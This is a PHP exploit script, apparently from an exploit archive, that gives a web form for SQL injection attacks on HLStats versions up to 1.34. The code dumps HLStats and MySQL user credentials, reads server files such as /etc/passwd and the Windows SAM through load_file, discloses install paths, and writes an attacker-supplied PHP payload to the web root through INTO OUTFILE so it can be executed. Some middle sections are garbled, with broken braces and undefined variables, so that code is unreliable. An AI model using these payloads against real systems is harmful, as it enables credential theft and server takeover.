HLStats <=1.34 (hlstats.php) Remote SQL Injection Exploit
=========================================================



<br><b>
<?php
/*
Live Exploit Code
SQL Inection + Path Disclosure
Affects HLStats HLStats <=1.34  and Hlstats >= 1.20
works with magic_quotes_gpc=On
by Michael Brooks
*/

 print "<title>HLStats SQL Injection Exploit</title>
 <body bgcolor=&#039;#009900&#039;>
 <font  color=&#039;#FF0000&#039;>
<b>--------------------------------------------------------------------------------------------------------------------------------------------></b><br><br>
<center><b> <br>
Welcome To HLstats Exploit code.<br><br>
</b></center> 
<br> 
SQL Inection + Path Disclosure<br>
Affects Hlstats >= 1.20 to HLStats <=1.34(current)<br>
Tested on Linux and Windows<br>
works with magic_quotes_gpc=On!<br>
HLStats has gone though 5 years with no exploits so this is a Birthday Present!<br>
Merry Christmass!<br>
By Michael Brooks<br>
<br>
<b>--------------------------------------------------------------------------------------------------------------------------------------------></b><br><br>
";
 
 print "
 	<form action=&#039;".$_SERVER[&#039;PHP_SELF&#039;]."&#039; method=&#039;post&#039;>
	<b>Target:</b><br>
	<input type=&#039;text&#039; name=&#039;target&#039; size=32><br>
	(hint: where the login form is. example: http://domain.com/path/hlstats.php )<br>
	<br><b>Proxy:</b>(ip:port or name:pass@ip:port)<br>
	<input type=&#039;text&#039; name=&#039;proxy&#039; size=32><br>
	(example: 127.0.0.1:8118   Use <a href=&#039;http://tor.eff.org&#039;>Tor</a>+<a href=&#039;http://www.privoxy.org/&#039;>Privoxy</a>. )<br>
	<br><br>
	If nothing is changed below this line then the exploit will attempt to get the database login information in plain text.
<b>--------------------------------------------------------------------------------------------------------------------------------------------></b><br><br>
	<H1>ATTACKS:</H1>
	<br>
	<b>Database Selects:</b><br>
	<br>
	OBTIAN HLStats logins:<br>
	<input type=&#039;submit&#039; name=&#039;button&#039; value=&#039;HLStats_Logins&#039;>(Passwords are stored as MD5 hashs, use: <a href=&#039;http://www.milw0rm.com/cracker/insert.php&#039;>Milw0rm&#039;s MD5 Cracker</a>)<br>
 		
 		  OBTIAN mysql.user logins:<br>
 		<input type=&#039;submit&#039; name=&#039;button&#039; value=&#039;Mysql_Logins&#039;><br>
	<br>

	<br>
 	<b>File IO:</b><br><br>
 	<b>Path Disclosure</b><br>
 	<input type=&#039;submit&#039; name=&#039;button&#039; value=&#039;Path&#039;><br>
	<br>
	<b>Plain Text Database Login Information</b><br>
	<input type=&#039;submit&#039; name=&#039;button&#039; value=&#039;Read_Login&#039;>
	(This will attempt to read the configuration file for hlstats and dump the PLAIN TEXT database login information.)<br>
	<br>
	<b>Read Other File</b><br>
	<input type=&#039;submit&#039; name=&#039;button&#039; value=&#039;Read_File&#039;>
	<input type=&#039;text&#039; name=&#039;read_file&#039; size=50>
	<br>example: /etc/passwd<br>
	OR for windows based systems: C:\\\\WINDOWS\\\\repair\\\\sam<br>
	<br><b>attempt payload:</b>(WARNING,  NO PROXY IS USED FOR UPLOADING PAYLOAD)<br>
	<input type=&#039;submit&#039;  name=&#039;button&#039; value=&#039;Upload&#039;>
	 &lt?php <input type=&#039;text&#039; name=&#039;payload&#039; size=50>?&gt <br>
	example: system(&#039;netstat&#039;); <br>
	
	</form>
	<br><b>--------------------------------------------------------------------------------------------------------------------------------------------></b><br>
	";

 //generic http class
class http{
	var $proxy_ip=&#039;&#039;, $proxy_port=&#039;&#039;, $proxy_name=&#039;&#039;, $proxy_pass=&#039;&#039;;
	
	function http_gpc_send($loc ,$cookie="", $postdata = "") { 
		 //overload function polymorphism between gets and posts
		 $url=parse_url($loc);
		 if(!isset($url[&#039;port&#039;])){
		   $url[&#039;port&#039;]=80;
		}
		//$ua=$_SERVER[&#039;HTTP_USER_AGENT&#039;];
		$ua=&#039;GPC/.01&#039;;
		 if($this->proxy_ip!=&#039;&#039;&&$this->proxy_port!=&#039;&#039;){
			$fp = pfsockopen( $this->proxy_ip, $this->proxy_port, &$errno, &$errstr, 120 );
			$url[&#039;path&#039;]=$url[&#039;host&#039;].&#039;:&#039;.$url[&#039;port&#039;].$url[&#039;path&#039;];
		 }else{
			$fp = fsockopen( $url[&#039;host&#039;], $url[&#039;port&#039;], &$errno, &$errstr, 120 );
		 }
		 
		 if( !$fp ) {
		    print "$errstr ($errno)<br>\nn";
		 } else {
		    if( $postdata==&#039;&#039; ) {
			fputs( $fp, "GET ".$url[&#039;path&#039;]."?".$url[&#039;query&#039;]." HTTP/1.1\r\n" );
		    } else {
			fputs( $fp, "POST ".$url[&#039;path&#039;]."?".$url[&#039;query&#039;]." HTTP/1.1\r\n" );
		    }
		    
		    if($this->proxy_name!=&#039;&#039;&&$this->proxy_pass!=&#039;&#039;){
			fputs($fp, "Proxy-Authorization: Basic ".base64_encode($this->proxy_name.":".$this->proxy_pass)."\r\n\r\n");
		    }

		    fputs($fp, "Host: ".$url[&#039;host&#039;].":".$url[&#039;port&#039;]."\r\n");
		    fputs( $fp, "User-Agent: ".$ua."\r\n" );
		    fputs( $fp, "Accept: text/plain\r\n" );
		    fputs( $fp,"Connection: Close\r\n" );
		    if($cookie!=&#039;&#039;){ 
			fputs( $fp, "Cookie: ".$cookie."\r\n" );
		    }
		    if( $postdata!=&#039;&#039; ) {
			$strlength = strlen( $postdata );
			fputs( $fp, "Content-type: application/x-www-form-urlencoded\r\n" );
			fputs( $fp, "Content-length: ".$strlength."\r\n\r\n" );
			fputs( $fp, $postdata);
		    }
		    fputs( $fp, "\n\n" );
		    
		   $output = "";
		   while( !feof( $fp ) ) {
			$output .= fgets( $fp, 1024 );
		   }
		    fclose( $fp );
		 }
		 return $output;
	}
	
	function proxy($proxy){ //user:pass@ip:port
		$proxyAuth=explode(&#039;@&#039;,$proxy);
		if(isset($proxyAuth[1])){
			$login=explode(&#039;:&#039;,$proxyAuth[0]);
			$this->proxy_name=$login[0];
			$this->proxy_pass=$login[1];
			
			$addr=explode(&#039;:&#039;,$proxyAuth[1]);
			$this->proxy_ip=$addr[0];
			$this->proxy_port=$addr[1];
		}else{
			$addr=explode(&#039;:&#039;,$proxy);
			$this->proxy_ip=$addr[0];
			$this->proxy_port=$addr[1];
		}
	}
	
	function get($url, $cookie=&#039;&#039;){
		return $this->http_gpc_send($url, $cookie);
	}

	function post($url, $cookie=&#039;&#039;, $post=&#039;&#039;){
		return $this->http_gpc_send($url,$cookie,$post);
	}
	
	function getServer($url){
		$resp=$this->http_gpc_send($url);
		$header=explode("Server: ",$resp);
		$server=explode("\n",$header[1]);
		return $server[0];
	}
}

//reuseable functions
function getPath($html){
	$path=&#039;&#039;;
	$resp=explode("array given in <b>",$html);
	if(isset($resp[1])){
		$resp = explode("</b>",$resp[1]);
	}else{
		$resp[0]=false;
	}
	return $resp[0];
}

function charEncode($string){
	$char="char(";
	$size=strlen($string);
	for($x=0;$x<$size;$x++){
		$char.=ord($string[$x]).", ";
	}
	$char[strlen($char)-2]=&#039;)%00&#039;;
	return $char;
}

function hex_encode($my_string)
{
$encoded="0x";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {$temp=dechex(ord($my_string[$k]));
    if (strlen($temp)==1) {$temp="0".$temp;}
    $encoded.=$temp;
  }
  return $encoded;
} 


//hlstats specific functions
function hl_get_sql($resp){
	//print htmlspecialchars($resp);
	$tmp=explode(&#039;<table &#039;,$resp);
	array_pop($tmp);
	$last=array_pop($tmp);
	$tbl=explode(&#039;</table>&#039;,$last);
	$table=$tbl[0];//ITS MY TABLE NOW!
	if(strstr($table,&#039;Victim&#039;)&&strstr($table,&#039;Times Killed&#039;)){
		$table=str_replace(&#039;border=0&#039;,&#039;border=1&#039;,$table);
		$table=str_replace(&#039;#002E8A&#039;,&#039;#000000&#039;,$table);
		$table=str_replace(&#039;#15154D&#039;,&#039;#CCCCCC&#039;,$table);
		$table=str_replace(&#039;#161652&#039;,&#039;#CCCCCC&#039;,$table);
		$table=&#039;<table &#039;.$table.&#039;</table>&#039;;
	}else{
		$table=false;
	}
	return $table;
}

function get_logins($addr){
	$http=new http();
	$data=&#039;&#039;;
	$resp=$http->get($addr."?mode=playerinfo&player=1&playerdata[lastName][]=1");
	$path=getPath($resp);
	$readfile=hex_encode($path);
	$pay="killLimit=99999%20union%20select%20load_file($readfile),1,1,1,1%20--%20";
	$resp=$http->post($addr."?mode=playerinfo&player=1",&#039;&#039;,$pay);
		
	$tmp=explode("define("DB_NAME", "",$resp);
	$tmp=explode(""",$tmp[1]);
	$data[db]=$tmp[0];

	$tmp=explode("define("DB_USER", "",$resp);
	$tmp=explode(""",$tmp[1]);
	$data[name]=$tmp[0];
	
	$tmp=explode("define("DB_PASS", "",$resp);
	$tmp=explode(""",$tmp[1]);
	$data[pass]=$tmp[0];
	
	$tmp=explode("define("DB_ADDR", "",$resp);
	$tmp=explode(""",$tmp[1]);
	$data[addr]=$tmp[0];
	
	$tmp=explode("define("DB_TYPE", "",$resp);
	$tmp=explode(""",$tmp[1]);
	$data[type]=$tmp[0];
	
	return $data;
}

	$http=new http();
	//hex_encode is used instead of quote marks
	$payload="killLimit=1000%20union%20select%20TABLE_NAME,TABLE_SCHEMA,1,1,1%20from%20information_schema.TABLES%20WHERE%20TABLE_NAME%20LIKE%20".hex_encode("%events_playerplayeractions")."%23";
	$resp=$http->post($attack."?mode=playerinfo&player=1",&#039;&#039;,$payload);
	$mid=explode(&#039;events_playerplayeractions&#039;,$resp);
	if(is_array($mid)){
		foreach($mid as $m){
				}
				print($fix);
			}
		}
			if(trim($v)!=&#039;0&#039;){//damn that zero!!
			}
		}
	}else{
	}
}

if(isset($_REQUEST[&#039;target&#039;])&&$_REQUEST[&#039;target&#039;]!=&#039;&#039;){
	//this exploit can take its sweet time. 
	set_time_limit(0);
	$http=new http();
	$addr=explode(&#039;?&#039;,$_REQUEST[&#039;target&#039;]);
	$addr=$addr[0];
	if(isset($_REQUEST[&#039;proxy&#039;])){
		$http->proxy($_REQUEST[&#039;proxy&#039;]);
	} 
	
	switch($_REQUEST[&#039;button&#039;]){
		case &#039;HLStats_Logins&#039;:
			$table=false;
				if(!$table){
					//no comments are used in this payload,  instead a second union select is used to finnish the query.
					$resp=$http->post($addr."?mode=playerinfo&player=1",&#039;&#039;,$pay);
					$table=hl_get_sql($resp);//  
				}
			}
					$resp=$http->post($addr."?mode=playerinfo&player=1",&#039;&#039;,$pay);
					$table=hl_get_sql($resp);//  			
			}
			if($table){
				$table=str_replace(&#039;Victim&#039;,&#039;username&#039;,$table);
				$table=str_replace(&#039;Kills per Death&#039;,&#039;playerId&#039;,$table);
				$table=str_replace(&#039;Deaths by&#039;,&#039;acclevel&#039;,$table);
				$table=str_replace(&#039;Times Killed&#039;,&#039;password&#039;,$table);
				$table=str_replace(&#039;Rank&#039;,&#039;Count&#039;,$table);
				print "<br>$table";
			}
			break;
		case &#039;Mysql_Logins&#039;:
			$pay="killLimit=1000%20union%20select%20user,password,File_priv,1,Host%20%20from%20mysql.user%20--%20";
			$resp=$http->post($addr."?mode=playerinfo&player=1",&#039;&#039;,$pay);
			$table=hl_get_sql($resp);
			$table=str_replace(&#039;Victim&#039;,&#039;User&#039;,$table);
			$table=str_replace(&#039;Kills per Death&#039;,&#039;Host&#039;,$table);
			$table=str_replace(&#039;Deaths by&#039;,&#039;File_priv&#039;,$table);
			$table=str_replace(&#039;Times Killed&#039;,&#039;Password&#039;,$table);
			$table=str_replace(&#039;Rank&#039;,&#039;Count&#039;,$table);
			print "<br>$table";
		break;
		case &#039;Read_File&#039;:
			$readfile=hex_encode($_REQUEST[read_file]);
			$pay="killLimit=99999%20union%20select%20load_file($readfile),1,1,1,1%20--%20";
			$resp=$http->post($addr."?mode=playerinfo&player=1",&#039;&#039;,$pay);			
			$tmp=explode(&#039;alt="player.gif"><b>&#039;,$resp);
			$data=explode("</font>",$tmp[1]);
			$data=$data[0];
			//this might be a bad thing:
			print &#039;data&#039;.$data; 		
		break;
		case &#039;Path&#039;:
			$resp=$http->get($addr."?mode=playerinfo&player=1&playerdata[lastName][]=1");
			$path=getPath($resp );
			print "Path Disclosure:$path<br>";
		break;	
		case &#039;Read_Login&#039;:
			$data=get_logins($addr);
			foreach($data as $var=>$val){
				   $tmp=explode(&#039;&quot&#039;,$val);
					$data[$var]=$tmp[0];
					print "<br>".$var.":".$tmp[0];
			}	
		break;
		case &#039;Upload&#039;:
			$resp=$http->get($addr."?mode=playerinfo&player=1&playerdata[lastName][]=1");
			$path=getPath($resp );
			$data=get_logins($addr);
			print $path."<br>";
			$tar=explode(&#039;/&#039;,$_REQUEST[&#039;target&#039;]);
			$paylink=$tar;
			array_pop($paylink);
			$paylink=implode(&#039;/&#039;,$paylink);
			if(strstr($path,&#039;:&#039;)){//if windows
				print "Windows Sytem<br>";
				$temp=explode(&#039;\\&#039;,$path);
			}else{//else *nix
				print "*nix System<br>";
				$temp=explode(&#039;/&#039;,$path);
			}
			array_pop($temp);
			$path=implode(&#039;/&#039;,$temp);
			mysql_connect($tar[2],$data[name],$data[pass]) or die(mysql_error());
			$name="data".rand();//rand is used so that this attack can be run multiple times.
			$sql="SELECT &#039;<?php ".$_REQUEST[payload]."?>&#039; INTO OUTFILE &#039;$path/$name.php&#039;";
			print "<br><a href=&#039;$paylink/$name.php&#039;><b> Execute Payload </b></a>";
			mysql_query($sql) or die(mysql_error());
		break;
		default:
			print &#039;No Attack!&#039;;
		break;
	}
}else{
	Print "No Target.";
}
?><br>--------------------------------------------------------------------------------------------------------------------------------------------><br>



